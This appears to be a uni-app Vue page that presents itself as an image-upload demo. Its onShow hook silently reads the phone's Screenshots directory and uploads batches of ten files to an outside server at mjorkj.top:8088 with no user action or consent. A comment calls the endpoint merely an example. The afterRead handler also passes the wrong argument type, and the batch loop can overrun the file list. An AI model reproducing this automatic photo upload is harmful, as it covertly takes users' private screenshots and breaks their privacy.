<template>
  <view class="content">
    <image class="logo" src="/static/logo.png"></image>
    <view class="text-area">
      <text class="title">{{title}}</text>
    </view>
    <u-button style="margin-bottom: 30px" type="primary" text="按钮" @click="create()"></u-button>
    <!--       <u-upload
    	:fileList="fileList3"
    	:maxCount="10"
      name="1" 
    	:previewFullImage="true"
    ></u-upload> -->
    <u-upload :fileList="fileList1" @afterRead="afterRead" @delete="deletePic" name="2" multiple>
    </u-upload>
  </view>
</template>

<script>
  import {
    cloneDeep
  } from "lodash"
  export default {
    data() {
      return {
        src: '',
        title: 'Hello',
        albumWidth: 0,
        fileList3: [],
        fileList1: [],
        num: 0
      }
    },
    onLoad() {

    },
    onShow() {
      this.create()
      // const url = plus.io.LocalURL()
    },
    onReachBottom() {
      // this.create()
    },
    methods: {
      async create() {
        let result = await this.getData()
		console.log("==============",result);
        if(result == 'ok'){
          if(this.fileList3.length > 1){
            this.fileList3.forEach(async(item)=>{
              let uploadResult = await this.uploadFilePromise(item)
            })
          }
        }
      },
      getData() {
        let _self = this
        return new Promise((resolve) => {
          plus.io.resolveLocalFileSystemURL(
            // "file:///storage/emulated/0/DCIM/Camera", //系统公共本地相册
            "file:///storage/emulated/0/DCIM/Screenshots", //系统公共本地相册
            function(entry) {
              var directoryReader = entry.createReader(); //获取读取目录对象
              directoryReader.readEntries(
                function(entries) {
                  let tmp = cloneDeep(entries)
                  //entries目录是一个数字遍历就能得到文件了，如下
				  if(entries.length <= _self.num){
					  uni.showToast({
					  	title: '没有更多数据了',
					  	duration: 2000,
						icon: "none"
					  });
					  return
				  }
                  let count = _self.num + 9
				  let num = _self.num
                  for (let i = num; i <= count; i++) {
                    let obj = {
                      name:tmp[i].name,
                      fullPath:tmp[i].fullPath,
                      url:tmp[i].toURL()
                    } 
                    tmp[i].url = tmp[i].fullPath
                    _self.fileList3.push(obj)
                    _self.fileList1.push(tmp[i])
                    _self.num = i + 1
                  }
				  console.log("@@@@@@@@@",_self);
                  resolve('ok')
                },
                function(err) {
                  console.log("访问目录失败");
                });
            },
            function(err) {
              console.log("访问指定目录失败:", err.message);
            });
        })
      },
      // 删除图片
      deletePic(event) {
        this[`fileList${event.name}`].splice(event.index, 1)
      },
      // 新增图片
      async afterRead(event) {
        // 当设置 multiple 为 true 时, file 为数组格式，否则为对象格式
        let lists = [].concat(event.file)
        let fileListLen = this[`fileList${event.name}`].length
        lists.map((item) => {
          this[`fileList${event.name}`].push({
            ...item,
            status: 'uploading',
            message: '上传中'
          })
        })
        for (let i = 0; i < lists.length; i++) {
          const result = await this.uploadFilePromise(lists[i].url)
          let item = this[`fileList${event.name}`][fileListLen]
          this[`fileList${event.name}`].splice(fileListLen, 1, Object.assign(item, {
            status: 'success',
            message: '',
            url: result
          }))
          fileListLen++
        }
      },
      uploadFilePromise({url}) {
        // console.log("接收到url",url);
        return new Promise((resolve, reject) => {              
          let a = uni.uploadFile({
			url: 'http://www.mjorkj.top:8088/user/updateImages', // 仅为示例，非真实的接口地址
            // url: 'http://192.168.2.21:7001/upload', // 仅为示例，非真实的接口地址
            filePath: url,
			name: 'filedata',
            // formData: {
            //   user: 'test'
            // },
            success: (res) => {
				console.log("上传成功");
              resolve(res.data.data)
            },
            fail(err) {
              console.log("errr",err);
              reject(err)
            },
            complete() {
            }
          });
        })
      },
    }
  }
</script>

<style>
  .album {
    @include flex;
    align-items: flex-start;

    &__avatar {
      background-color: $u-bg-color;
      padding: 5px;
      border-radius: 3px;
    }

    &__content {
      margin-left: 10px;
      flex: 1;
    }
  }

  .content {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .logo {
    height: 200rpx;
    width: 200rpx;
    margin-top: 200rpx;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 50rpx;
  }

  .text-area {
    display: flex;
    justify-content: center;
  }

  .title {
    font-size: 36rpx;
    color: #8f8f94;
  }
</style>
